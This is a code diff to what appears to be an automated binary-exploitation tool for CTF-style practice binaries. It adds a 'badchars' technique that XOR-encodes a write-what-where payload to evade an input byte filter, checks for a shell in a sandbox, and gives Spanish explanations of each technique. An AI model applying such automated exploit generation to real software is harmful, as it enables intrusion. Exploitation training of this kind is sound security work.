@@ -258,6 +258,25 @@ def autopwn(binary: str, config=None, store=None,
         except Exception as e:
             res.attempts.append(("write4", False, str(e)))
 
+    # combo A7: badchars -- write-what-where PAST an input byte filter. Same shape as write4, but
+    # the whole payload (gadget addresses included) is filtered for a small forbidden-byte set,
+    # so the target string has to be XOR-encoded with a key that keeps both the key and the
+    # encoding out of that set, written, then decoded in place. Tried after write4, which would
+    # just get its raw string write silently corrupted by the filter if it ran against this shape.
+    if want("badchars") and not res.win_exploit:
+        try:
+            from .autobadchars import autobadchars, _badchars_applicable
+            if _badchars_applicable(binary):
+                log("[combo] badchars: write-what-where pasando filtro de entrada (sandbox)...")
+                rbc = autobadchars(binary)
+                verdict = True if rbc.get("verified") else (None if rbc.get("ok") else False)
+                res.attempts.append(("badchars", verdict, rbc.get("detail") or rbc.get("note", "")))
+                res.win_exploit = res.win_exploit or bool(rbc.get("verified"))
+                log(f"[combo] badchars -> {'SHELL VERIFICADA' if rbc.get('verified') else 'no verificado'}")
+                learn(f"badchars verified={rbc.get('verified')} {rbc.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("badchars", False, str(e)))
+
     # combo B: ROP chain (ret2libc / execve). On a PIE binary the base must be resolved first, so
     # use the PIE-aware ROP verifier; otherwise the static/no-PIE ROP builder (with string staging
     # + SROP). Both verify by getting a real shell in the sandbox. Skipped once we already have a
@@ -548,6 +567,8 @@ def _why(mit: dict, has_win: bool, technique: str) -> str:
         return "gadget `pop rdi; pop rsi; pop rdx; ret` disponible pero el regalo esta repartido en varias funciones -> se llaman todas, cada una con sus propios argumentos, probando el orden correcto"
     if "write4" in t:
         return "sin win()/string util ya presente -> un gadget pop+mov escalona un nombre de fichero adivinado en memoria y se llama a la funcion que lo abre"
+    if "badchars" in t:
+        return "el filtro de entrada bloquea el string objetivo sin codificar -> se XOR-codifica con una clave que evita los bytes prohibidos, se escribe, y se decodifica en el propio sitio con un gadget xor"
     if "rop" in t:
         return ("sin win()/system directo -> cadena ROP execve por syscall"
                 + (" (PIE: base resuelta en sandbox)" if pie else ""))
